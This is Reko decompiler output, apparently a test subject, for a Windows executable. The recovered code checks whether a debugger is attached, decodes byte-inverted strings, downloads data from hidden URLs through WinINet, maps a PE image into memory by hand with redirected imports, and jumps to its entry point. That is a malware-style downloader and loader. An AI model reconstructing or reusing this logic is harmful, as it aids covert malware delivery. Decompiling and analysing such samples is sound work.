// subject.c
// Generated by decompiling subject.exe
// using Reko decompiler version VERSION

#include "subject.h"

// 003E1000: Register word32 fn003E1000(Stack (ptr Eq_3) dwArg04)
word32 fn003E1000(Eq_3 * dwArg04)
{
	return dwArg04 + Mem0[dwArg04 + 0x3C:word32];
}

// 003E101E: void fn003E101E(Stack (ptr Eq_3) dwArg04, Stack Eq_9 dwArg08, Stack Eq_10 dwArg0C)
void fn003E101E(Eq_3 * dwArg04, Eq_9 dwArg08, SIZE_T dwArg0C)
{
	fn003E1EA7(dwArg08, dwArg04, dwArg0C);
	VirtualProtect(dwArg08, dwArg0C, 0x02, fp - 0x08);
}

// 003E10B2: Register Eq_28 fn003E10B2(Stack Eq_9 dwArg04, Stack (ptr Eq_3) dwArg08, Stack Eq_9 dwArg0C)
Eq_28 fn003E10B2(Eq_9 dwArg04, Eq_3 * dwArg08, Eq_9 dwArg0C)
{
	Eq_28 eax_43;
	Eq_28 eax_21 = GetProcAddress(dwArg04, dwArg0C);
	if (fn003E1F8E(dwArg08, &globals->b3E3050) == 0x00)
	{
		if (fn003E1F12(0x003E3050, dwArg0C, &globals->b3E3060) == 0x00)
		{
			globals->t3E9A10 = eax_21;
			&eax_43.u0->t0000 = 0x003E1050;
			return eax_43;
		}
		if (fn003E1F12(0x003E3060, dwArg0C, &globals->b3E3074) == 0x00)
		{
			globals->t3E9A14 = eax_21;
			&eax_43.u0->t0000 = 0x003E1082;
			return eax_43;
		}
	}
	eax_43 = eax_21;
	return eax_43;
}

// 003E1125: Register byte fn003E1125(Stack Eq_9 dwArg04)
byte fn003E1125(Eq_9 dwArg04)
{
	return (byte) (-(dwArg04 & 0x80000000) == 0x00);
}

// 003E1139: void fn003E1139(Register ptr32 ebp, Stack (ptr Eq_3) dwArg04, Stack Eq_9 dwArg08)
void fn003E1139(ptr32 ebp, Eq_3 * dwArg04, Eq_9 dwArg08)
{
	globals->t3E9A18 = GetModuleHandleA(0x00);
	globals->t3E9A1C = dwArg08;
	ptr32 esp_208 = fp - 44;
	word32 dwLoc08_211 = dwArg08 + Mem21[dwArg04 + 0x80:word32];
	while (true)
	{
		union Eq_9 * esp_65 = esp_208 - 0x04;
		*esp_65 = (union Eq_9 *) dwLoc08_211;
		if (*((char *) *esp_65 + 0x0C) == 0x00)
			break;
		word32 * dwLoc10_114;
		*esp_65 = (union Eq_9 *) dwArg08;
		word32 ecx_83 = Mem80[esp_65 + 0x00:word32] + Mem80[dwLoc08_211 + 0x0C:word32];
		*esp_65 = (union Eq_9 *) ecx_83;
		Eq_9 eax_88 = LoadLibraryA(*esp_65);
		if (*((word32) dwLoc08_211 + 0x04) == 0x00)
		{
			*(esp_65 - 0x04) = (union Eq_9 *) dwLoc08_211;
			struct Eq_145 * eax_215 = *(esp_65 - 0x04);
			*(esp_65 - 0x04) = (union Eq_9 *) dwArg08;
			dwLoc10_114 = *(esp_65 - 0x04) + eax_215->dw0010;
		}
		else
		{
			*(esp_65 - 0x04) = (union Eq_9 *) dwArg08;
			dwLoc10_114 = (word32) *dwLoc08_211 + *(esp_65 - 0x04);
		}
		*(esp_65 - 0x04) = (union Eq_9 *) dwLoc08_211;
		union Eq_9 * esp_112 = esp_65;
		word32 dwLoc18_103 = dwArg08 + Mem97[Mem97[(esp_65 - 0x04) + 0x00:word32] + 0x10:word32];
		while (*dwLoc10_114 != 0x00)
		{
			ptr32 esp_145;
			Eq_28 dwLoc14_144;
			union Eq_9 * esp_119 = esp_112 - 0x04;
			*esp_119 = (union Eq_9 *) eax_88;
			*(esp_119 - 0x04) = dwLoc10_114;
			*(esp_119 - 0x04) = **(esp_119 - 0x04);
			if ((word32) fn003E1125(dwArg00) != 0x00)
			{
				*esp_119 = *dwLoc10_114;
				*esp_119 = (union Eq_9 *) (word32) (word16) (*esp_119 & 0xFFFF);
				*(esp_119 - 0x04) = (union Eq_9 *) eax_88;
				esp_145 = esp_119 - 0x04;
				dwLoc14_144 = GetProcAddress(*(esp_119 - 0x04), *esp_119);
			}
			else
			{
				*esp_119 = (union Eq_9 *) ((word32) dwArg08 + *dwLoc10_114 + 0x02);
				*(esp_119 - 0x04) = (union Eq_9 *) ecx_83;
				*(esp_119 - 0x08) = (union Eq_9 *) eax_88;
				esp_145 = (char *) esp_119 + 0x04;
				dwLoc14_144 = fn003E10B2(dwArg00, dwArg04, dwArg08);
			}
			union Eq_28 * esp_147 = esp_145 - 0x04;
			*esp_147 = (union Eq_28 *) dwLoc18_103;
			Eq_28 eax_149 = *esp_147;
			*esp_147 = (union Eq_28 *) dwLoc14_144;
			*eax_149 = *esp_147;
			esp_112 = (union Eq_9 *) ((char *) esp_147 + 0x04);
			dwLoc18_103 = (word32) dwLoc18_103 + 0x04;
			dwLoc10_114 = dwLoc10_114 + 0x01;
		}
		union Eq_9 * esp_205 = esp_112 - 0x04;
		*esp_205 = (union Eq_9 *) dwLoc08_211;
		esp_208 = (char *) esp_205 + 0x04;
		dwLoc08_211 = (char *) *esp_205 + 0x0014;
	}
}

// 003E1270: void fn003E1270(Register ui32 ecx, Stack word32 dwArg04, Stack word32 dwArg08, Stack ui32 dwArg0C)
void fn003E1270(ui32 ecx, word32 dwArg04, word32 dwArg08, ui32 dwArg0C)
{
	ptr32 esp_10 = fp - 0x08;
	do
	{
		LPOVERLAPPED * esp_20 = esp_10 - 0x04;
		*esp_20 = (LPOVERLAPPED *) null;
		*(esp_20 - 0x04) = fp - 0x08;
		*(esp_20 - 0x08) = dwArg0C - (ecx & 0x00);
		*(esp_20 - 0x0C) = dwArg08;
		*(esp_20 - 0x10) = dwArg04;
		esp_10 = esp_20 - 0x10;
	} while (ReadFile(*(esp_20 - 0x10), *(esp_20 - 0x0C), *(esp_20 - 0x08), *(esp_20 - 0x04), *esp_20) != 0x00 && (ecx & 0x00) != dwArg0C);
}

// 003E12A7: void fn003E12A7(Register ui32 ecx, Stack word32 dwArg04, Stack word32 dwArg08, Stack word32 dwArg0C)
void fn003E12A7(ui32 ecx, word32 dwArg04, word32 dwArg08, word32 dwArg0C)
{
}

// 003E12DF: void fn003E12DF(Register ui32 ecx, Stack (ptr Eq_483) dwArg04, Stack ui32 dwArg08, Stack uint32 dwArg0C)
void fn003E12DF(ui32 ecx, Eq_483 * dwArg04, ui32 dwArg08, uint32 dwArg0C)
{
	uint32 dwLoc08_10 = ecx & 0x00;
	while (dwLoc08_10 < dwArg0C)
	{
		fn003E12A7(dwArg08, dwArg04->dw0004, dwArg08 + dwLoc08_10 * 0x04, 0x08);
		fn003E1270(dwArg08, dwArg04->dw0000, dwArg08 + dwLoc08_10 * 0x04, 0x08);
		dwLoc08_10 = dwLoc08_10 + 0x02;
	}
}

// 003E1424: Register Eq_366 fn003E1424(Stack (ptr Eq_3) dwArg04)
HANDLE fn003E1424(Eq_3 * dwArg04)
{
	CloseHandle(dwArg04->b0000);
	Eq_366 v7_18 = dwArg04[0x04];
	CloseHandle(v7_18);
	return v7_18;
}

// 003E1440: Register word32 fn003E1440(Register ui32 ecx, Register ptr32 ebp)
word32 fn003E1440(ui32 ecx, ptr32 ebp)
{
	if ((word32) fn003E1B30()->ptr0030->b0002 == 0x00)
	{
		globals->dw411056 = 30301;
		globals->dw41105A = 5484;
		globals->dw41105E = 0x727A;
		globals->dw411062 = 8655;
		if (CreatePipe(fp - 0x24, fp - 0x14, null, 0x10) != 0x00 && CreatePipe(fp - 0x18, fp - 0x20, null, 0x10) != 0x00)
		{
			CreateThread(null, 0x00, &globals->t3E1333, fp - 0x24, 0x00, fp - 0x0C);
			fn003E12DF(ecx, fp - 0x18, 0x003E4000, globals->dw3E9A03 >> 0x02);
			*(fp - 0x70) = fn003E1424(fp - 0x18) - 0x20;
			ptr32 ebp_152 = fn003E1424(dwArg00);
			*(fp - 0x70) = *(ebp_152 - 0x24);
			CloseHandle(*(fp - 0x70));
			*(fp - 116) = 0x003E4000;
			*(ebp_152 - 0x0C) = fn003E1000(dwArg00);
			if (*(ebp_152 - 0x0C) != 0x00)
			{
				*(fp - 116) = *(ebp_152 - 0x0C);
				*(fp - 116) = *((char *) *(fp - 116) + 0x0034);
				*(ebp_152 - 44) = *(fp - 116);
				*(fp - 116) = *((char *) *(ebp_152 - 0x0C) + 0x0054);
				*(fp - 0x78) = *(ebp_152 - 44);
				*(fp - 0x7C) = 0x003E4000;
				fn003E101E(dwArg00, dwArg04, dwArg08);
				*(fp - 116) = *(ebp_152 - 44);
				*(fp - 0x78) = 0x003E4000;
				*(fp - 0x7C) = *(ebp_152 - 0x0C);
				fn003E1B40(dwArg00, dwArg04, dwArg08);
				*(fp - 116) = *(ebp_152 - 44);
				*(ebp_152 - 0x28) = fn003E1000(dwArg00);
				if (*(ebp_152 - 0x28) != 0x00)
				{
					*(fp - 116) = *(ebp_152 - 44);
					*(fp - 0x78) = *(ebp_152 - 0x28);
					fn003E1139(ebp_152, dwArg00, dwArg04);
					*(fp - 116) = *(ebp_152 - 44);
					*(fp - 0x78) = *(ebp_152 - 0x28);
					fn003E1CD1(ebp_152, dwArg00, dwArg04);
					struct Eq_831 * eax_238 = *(ebp_152 - 0x18);
					*(fp - 116) = *(ebp_152 - 44);
					eax_238->dw0008 = *(fp - 116);
					*(fp - 116) = *(ebp_152 - 0x0C);
					struct Eq_864 * eax_248 = *(fp - 116);
					*(fp - 116) = *(ebp_152 - 44);
					word32 ecx_255 = *(fp - 116) + eax_248->dw0028;
					*(ebp_152 - 0x30) = ecx_255;
					word32 esp_258;
					word32 ebp_259;
					byte SCZO_260;
					word32 eax_261;
					byte SZO_262;
					byte C_263;
					byte Z_264;
					word32 ecx_265;
					(*(ebp_152 - 0x30))();
				}
			}
		}
	}
	return 0x00;
}

// 003E15B4: void fn003E15B4(Register ui32 ecx, Stack word32 dwArg04, Stack word32 dwArg08, Stack word32 dwArg0C)
void fn003E15B4(ui32 ecx, word32 dwArg04, word32 dwArg08, word32 dwArg0C)
{
	ptr32 esp_19 = fp - 0x0C;
	ui32 dwLoc0C_12 = ecx & 0x00;
	while (true)
	{
		ptr32 * esp_21 = esp_19 - 0x04;
		*esp_21 = fp - 0x08;
		*(esp_21 - 0x04) = dwArg0C;
		*(esp_21 - 0x04) = *(esp_21 - 0x04) - dwLoc0C_12;
		word32 eax_34 = dwArg08 + dwLoc0C_12;
		*(esp_21 - 0x08) = eax_34;
		*(esp_21 - 0x0C) = dwArg04;
		word32 ebp_43;
		word32 ecx_44;
		byte SZO_45;
		byte C_46;
		word32 eax_47;
		byte SCZO_48;
		byte Z_49;
		WININET.dll!InternetReadFile();
		if (eax_47 == 0x00 || (ecx & 0x00) == 0x00)
			break;
		dwLoc0C_12 = dwLoc0C_12 + (ecx & 0x00);
	}
	*(esp_19 - 0x04) = dwLoc0C_12;
}

// 003E15FA: void fn003E15FA(Stack (ptr byte) dwArg04)
void fn003E15FA(byte * dwArg04)
{
	while ((word32) *dwArg04 != 0x00)
	{
		*dwArg04 = (byte) (0xFF - (word32) (*dwArg04));
		dwArg04 = dwArg04 + 0x01;
	}
}

// 003E1678: Register word32 fn003E1678(Register ptr32 ebp)
word32 fn003E1678(ptr32 ebp)
{
	fn003E1DDA();
	fn003E15FA(fp - 0x54);
	fn003E15FA(fp - 0x80);
	fn003E15FA(fp - 0x9C);
	word32 ebp_311;
	byte SCZO_312;
	word32 ecx_313;
	word32 eax_314;
	byte Z_315;
	byte SZO_316;
	byte C_317;
	byte SO_318;
	ptr32 esp_310;
	WININET.dll!InternetOpenA();
	if (fp != 0x54)
	{
		int32 dwLocA0_344 = dwLocA0 & 0x00;
		while (dwLocA0_344 < 0x02)
		{
			ptr32 dwLocB0_361;
			if (dwLocA0_344 == 0x00)
				dwLocB0_361 = fp - 0x80;
			else
				dwLocB0_361 = fp - 0x9C;
			word32 * esp_362 = esp_310 - 0x04;
			*esp_362 = 0x00;
			*(esp_362 - 0x04) = 0x04083000;
			*(esp_362 - 0x08) = 0x00;
			*(esp_362 - 0x0C) = 0x00;
			*(esp_362 - 0x10) = dwLocB0_361;
			*(esp_362 - 0x14) = fp - 0x54;
			word32 ebp_379;
			byte SCZO_380;
			ui32 ecx_381;
			word32 eax_382;
			byte Z_383;
			byte SZO_384;
			byte C_385;
			byte SO_386;
			WININET.dll!InternetOpenUrlA();
			if (eax_382 != 0x00)
			{
				*(esp_310 - 0x04) = 0x1000;
				*(esp_310 - 0x08) = 0x00;
				*(esp_310 - 0x0C) = eax_382;
				fn003E15B4(ecx_381, dwArg00, dwArg04, dwArg08);
				*(esp_310 - 0x04) = eax_382;
				word32 ebp_420;
				byte SCZO_421;
				word32 ecx_422;
				word32 eax_423;
				byte Z_424;
				byte SZO_425;
				byte C_426;
				byte SO_427;
				WININET.dll!InternetCloseHandle();
			}
			dwLocA0_344 = dwLocA0_344 + 0x01;
		}
		ptr32 * esp_433 = esp_310 - 0x04;
		*esp_433 = fp - 0x54;
		word32 ebp_436;
		byte SCZO_437;
		word32 ecx_438;
		word32 eax_439;
		byte Z_440;
		byte SZO_441;
		byte C_442;
		byte SO_443;
		WININET.dll!InternetCloseHandle();
	}
	word32 * esp_337 = esp_310 - 0x04;
	*esp_337 = 0x00;
	fn003E1DE1();
	return *esp_337;
}

// 003E1B12: Register Eq_21 Win32CrtStartup()
DWORD Win32CrtStartup()
{
	*(fp - 0x08) = fn003E1440(fn003E1678(fp - 0x04), fp - 0x04);
	*(fp - 0x0C) = *(fp - 0x08);
	ExitProcess(*(fp - 0x0C));
}

// 003E1B30: Register word32 fn003E1B30()
word32 fn003E1B30()
{
	return fs->dw0018;
}

// 003E1B40: void fn003E1B40(Stack (ptr Eq_3) dwArg04, Stack Eq_9 dwArg08, Stack Eq_10 dwArg0C)
void fn003E1B40(Eq_3 * dwArg04, Eq_9 dwArg08, SIZE_T dwArg0C)
{
	word16 ax_17 = dwArg04[0x06];
	cui16 wLoc14_114 = wLoc14 & 0x00;
	while ((word32) wLoc14_114 < (word32) ax_17)
	{
		Eq_10 dwLoc2C_120;
		Eq_10 eax_60 = (dwArg04 + 0x00F8)[(word32) wLoc14_114 *s 0x28 + 0x08];
		Eq_10 eax_69 = (dwArg04 + 0x00F8)[(word32) wLoc14_114 *s 0x28 + 0x10];
		if (eax_60 < eax_69)
			dwLoc2C_120 = eax_60;
		else
			dwLoc2C_120 = eax_69;
		fn003E1EA7(dwArg0C + Mem0[((word32) wLoc14_114 *s 0x28 + 0x0C) + (dwArg04 + 0xF8):word32], dwArg08 + Mem0[((word32) wLoc14_114 *s 0x28 + 0x14) + (dwArg04 + 0xF8):word32], dwLoc2C_120);
		wLoc14_114 = wLoc14_114 + 0x01;
	}
}

// 003E1C09: Register ui32 fn003E1C09(Register Eq_1244 ecx, Stack ui32 dwArg04)
ui32 fn003E1C09(Eq_1244 ecx, ui32 dwArg04)
{
	ui32 dwLoc08_10 = ecx & 0x00;
	if ((dwArg04 & 0x04000000) != 0x00)
		dwLoc08_10 = ecx & 0x00 | 0x0200;
	ui32 dwLoc08_115;
	if ((dwArg04 & 0x20000000) != 0x00)
	{
		if ((dwArg04 & 0x40000000) != 0x00)
		{
			if ((dwArg04 & 0x80000000) != 0x00)
				dwLoc08_115 = dwLoc08_10 | 0x40;
			else
				dwLoc08_115 = dwLoc08_10 | 0x20;
		}
		else if ((dwArg04 & 0x80000000) != 0x00)
			dwLoc08_115 = dwLoc08_10 | 0x80;
		else
			dwLoc08_115 = dwLoc08_10 | 0x10;
	}
	else if ((dwArg04 & 0x40000000) != 0x00)
	{
		if ((dwArg04 & 0x80000000) != 0x00)
			dwLoc08_115 = dwLoc08_10 | 0x04;
		else
			dwLoc08_115 = dwLoc08_10 | 0x02;
	}
	else if ((dwArg04 & 0x80000000) != 0x00)
		dwLoc08_115 = dwLoc08_10 | 0x08;
	else
		dwLoc08_115 = dwLoc08_10 | 0x01;
	return dwLoc08_115;
}

// 003E1CD1: void fn003E1CD1(Register ptr32 ebp, Stack (ptr Eq_3) dwArg04, Stack Eq_9 dwArg08)
void fn003E1CD1(ptr32 ebp, Eq_3 * dwArg04, Eq_9 dwArg08)
{
	ptr32 esp_15 = fp - 0x20;
	word16 ax_17 = dwArg04[0x06];
	cui16 wLoc14_23 = wLoc14 & 0x00;
	while ((word32) wLoc14_23 < (word32) ax_17)
	{
		word32 edx_44 = dwArg08 + Mem0[((word32) wLoc14_23 *s 0x28 + 0x0C) + (dwArg04 + 0xF8):word32];
		PDWORD * esp_49 = esp_15 - 0x04;
		*esp_49 = (PDWORD *) (dwArg04 + 0x00F8);
		*esp_49 = *((char *) *esp_49 + ((word32) ((word32) wLoc14_23 *s 0x28) + 0x08));
		Eq_22 eax_56 = *esp_49;
		*esp_49 = (PDWORD *) (fp - 0x18);
		*(esp_49 - 0x04) = (word32) (dwArg04 + 0x00F8)[(word32) wLoc14_23 *s 0x28 + 0x24];
		*(esp_49 - 0x04) = fn003E1C09(dwArg04 + 0x00F8, dwArg00);
		*(esp_49 - 0x08) = (PDWORD *) eax_56;
		*(esp_49 - 0x0C) = edx_44;
		VirtualProtect(*(esp_49 - 0x0C), *(esp_49 - 0x08), *(esp_49 - 0x04), *esp_49);
		esp_15 = esp_49 - 0x0C;
		wLoc14_23 = wLoc14_23 + 0x01;
	}
}

// 003E1D70: Register int32 fn003E1D70(Stack int32 dwArg04)
int32 fn003E1D70(int32 dwArg04)
{
	int32 eax_11;
	if (dwArg04 >= 0x41 && dwArg04 <= 0x5A)
		eax_11 = dwArg04 + 0x20;
	else
		eax_11 = dwArg04;
	return eax_11;
}

// 003E1DDA: void fn003E1DDA()
void fn003E1DDA()
{
}

// 003E1DE1: void fn003E1DE1()
void fn003E1DE1()
{
}

// 003E1EA7: void fn003E1EA7(Stack Eq_9 dwArg04, Stack (ptr Eq_3) dwArg08, Stack Eq_10 dwArg0C)
void fn003E1EA7(Eq_9 dwArg04, Eq_3 * dwArg08, SIZE_T dwArg0C)
{
	while (true)
	{
		dwArg0C = dwArg0C - 0x01;
		if (dwArg0C == 0x00)
			break;
		*dwArg04 = dwArg08->b0000;
		dwArg04 = (word32) dwArg04 + 0x01;
		dwArg08 = dwArg08 + 0x01;
	}
}

// 003E1F12: Register int32 fn003E1F12(Register word32 ecx, Stack Eq_9 dwArg04, Stack (ptr byte) dwArg08)
int32 fn003E1F12(word32 ecx, Eq_9 dwArg04, byte * dwArg08)
{
	while (true)
	{
		int32 eax_31 = (word32) *dwArg04 - (word32) (*dwArg08);
		int32 dwLoc08_34 = eax_31;
		if (eax_31 != 0x00 || (int32) (*dwArg08) == 0x00)
			break;
		dwArg04 = (word32) dwArg04 + 0x01;
		dwArg08 = dwArg08 + 0x01;
	}
	if (eax_31 < 0x00)
		dwLoc08_34 = eax_31 | ~0x00;
	else if (eax_31 > 0x00)
		dwLoc08_34 = 0x01;
	return dwLoc08_34;
}

// 003E1F8E: Register word32 fn003E1F8E(Stack (ptr Eq_3) dwArg04, Stack (ptr byte) dwArg08)
word32 fn003E1F8E(Eq_3 * dwArg04, byte * dwArg08)
{
	do
	{
		word32 eax_23 = fn003E1D70((word32) dwArg04->b0000);
		dwArg04 = dwArg04 + 0x01;
		word32 eax_37 = fn003E1D70((word32) *dwArg08);
		dwArg08 = dwArg08 + 0x01;
	} while (eax_23 != 0x00 && eax_23 == eax_37);
	return eax_23 - eax_37;
}

